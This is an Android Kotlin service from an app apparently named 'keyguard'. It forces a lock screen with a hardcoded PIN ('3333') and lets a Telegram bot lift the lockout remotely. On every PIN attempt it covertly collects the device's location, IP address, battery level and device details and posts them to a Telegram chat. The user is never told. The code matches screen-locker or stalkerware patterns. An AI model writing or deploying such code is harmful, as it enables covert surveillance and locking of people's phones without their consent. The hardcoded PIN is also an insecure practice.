package com.example.keyguard

import android.app.Service
import android.content.Intent
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import android.widget.Toast
import kotlinx.coroutines.*
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.*
import kotlin.coroutines.suspendCoroutine

class LockScreenService : Service() {

    private lateinit var telegramBotHandler: TelegramBotHandler
    private var failedAttempts = 0
    private var lockoutEndTime = 0L
    private val lockoutHandler = Handler(Looper.getMainLooper())
    private var isLockoutActive = false

    override fun onCreate() {
        super.onCreate()
        Log.d("LockScreenService", "Service created")

        telegramBotHandler = TelegramBotHandler(
            context = this,
            botToken = Constants.TELEGRAM_BOT_TOKEN,
            chatId = Constants.TELEGRAM_CHAT_IDS.first(),
            resetLockoutCallback = { resetLockout() }
        )
        telegramBotHandler.startListening()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.d("LockScreenService", "Service started")

        // Проверяем, есть ли PIN-код в интенте
        intent?.let {
            val pinCode = it.getStringExtra("PIN_CODE")
            pinCode?.let { pin ->
                Log.d("LockScreenService", "Received PIN code: $pin")
                checkPin(pin)
            }
        }

        // Запускаем соответствующую активность в зависимости от выбранного метода разблокировки
        val preferences = getSharedPreferences("settings", MODE_PRIVATE)
        val method = preferences.getString("unlock_method", "PIN")
        val lockScreenIntent = if (method == "PIN") {
            Intent(this, LockScreenActivity::class.java)
        } else {
            Intent(this, PatternLockActivity::class.java)
        }
        lockScreenIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_SINGLE_TOP)
        startActivity(lockScreenIntent)
        Log.d("LockScreenService", "LockScreenActivity started from service")

        return START_STICKY
    }

    private fun resetLockout() {
        Log.d("LockScreenService", "Lockout reset")
        failedAttempts = 0
        isLockoutActive = false
        lockoutEndTime = 0L
        lockoutHandler.removeCallbacks(lockoutRunnable)
    }

    private val lockoutRunnable = Runnable {
        isLockoutActive = false
        lockoutEndTime = 0L
        Log.d("LockScreenService", "LockoutRunnable executed")
    }

    private fun checkPin(enteredPin: String) {
        val correctPin = "3333" //нужный PIN

        if (isLockoutActive && System.currentTimeMillis() < lockoutEndTime) {
            Log.d("LockScreenService", "Too many failed attempts")
            Toast.makeText(this, "Too many failed attempts. Try again later.", Toast.LENGTH_SHORT).show()
            return
        }

        if (enteredPin == correctPin) {
            Log.d("LockScreenService", "PIN correct")
            failedAttempts = 0
            resetLockout()
            Toast.makeText(this, "Unlocked", Toast.LENGTH_SHORT).show()
            sendUnlockNotification(true)
        } else {
            Log.d("LockScreenService", "PIN incorrect")
            failedAttempts++
            if (failedAttempts >= 3) {
                isLockoutActive = true
                lockoutEndTime = System.currentTimeMillis() + (failedAttempts * 20 * 1000L)
                lockoutHandler.postDelayed(lockoutRunnable, lockoutEndTime - System.currentTimeMillis())
            }
            Toast.makeText(this, "Incorrect PIN. Please try again.", Toast.LENGTH_SHORT).show()
            sendUnlockNotification(false)
        }
    }

    private fun sendUnlockNotification(success: Boolean) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val location = suspendCoroutine<String> { continuation ->
                    DataCollector.getLocation(this@LockScreenService) { location ->
                        Log.d("LockScreenService", "Location: $location")
                        continuation.resumeWith(Result.success(location))
                    }
                }
                val batteryLevel = DataCollector.getBatteryLevel(this@LockScreenService)
                val deviceInfo = DataCollector.getDeviceInfo(this@LockScreenService)
                val ipAddress = DataCollector.getIpAddress()
                val attemptType = if (success) "SUCCESS" else "FAILURE"
                val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())

                val data = JSONObject().apply {
                    put("timestamp", timestamp)
                    put("attemptType", attemptType)
                    put("location", location)
                    put("batteryLevel", batteryLevel)
                    put("deviceInfo", deviceInfo)
                    put("ipAddress", ipAddress)
                }

                val formattedMessage = formatMessage(data)
                Log.d("LockScreenService", "Sending message to Telegram: $formattedMessage")
                telegramBotHandler.sendTelegramMessage(formattedMessage)
                Log.d("LockScreenService", "Message sent to Telegram: $formattedMessage")
            } catch (e: Exception) {
                Log.e("LockScreenService", "Error in sendUnlockNotification", e)
            }
        }
    }

    private fun formatMessage(data: JSONObject): String {
        return """
        |*Unlock Attempt Log*
        |*Timestamp:* ${data.getString("timestamp")}
        |*Attempt Type:* ${data.getString("attemptType")}
        |*Location:* ${data.getString("location")}
        |*Battery Level:* ${data.getInt("batteryLevel")}% 
        |*Device Info:* ${data.getString("deviceInfo")}
        |*IP Address:* ${data.getString("ipAddress")}
        """.trimMargin()
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }
}
